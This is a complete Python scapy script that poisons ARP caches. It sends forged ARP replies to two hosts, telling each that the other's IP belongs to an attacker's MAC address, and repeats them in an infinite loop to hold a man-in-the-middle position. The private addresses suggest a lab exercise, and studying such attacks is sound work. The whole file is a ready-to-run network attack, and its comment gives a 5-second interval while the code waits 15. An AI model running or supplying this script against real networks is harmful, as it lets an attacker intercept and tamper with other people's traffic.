from scapy.all import *
import time

# Define the IP and MAC addresses for the hosts involved
A = "10.0.2.4"
A_mac = "08:00:27:1b:11:df"
B = "10.0.2.5"
B_mac = "08:00:27:da:74:5d"
M = "10.0.2.15"
M_mac = "08:00:27:aa:b1:56"

# Function to create an ARP reply packet to poison ARP cache
def get_arp_spoof_pkt(victim_ip, victim_mac, spoof_ip, attacker_mac):
    ether = Ether(dst=victim_mac)
    arp = ARP(psrc=spoof_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac, op=2)  # op=2 for ARP reply
    return ether / arp

# Create ARP packets
pkt_a_to_b = get_arp_spoof_pkt(A, A_mac, B, M_mac)  # Tell A that B's IP is associated with M's MAC
pkt_b_to_a = get_arp_spoof_pkt(B, B_mac, A, M_mac)  # Tell B that A's IP is associated with M's MAC

# Send packets every 5 seconds to maintain the ARP poisoning
while True:
    sendp(pkt_a_to_b, verbose=False)
    sendp(pkt_b_to_a, verbose=False)
    time.sleep(15)
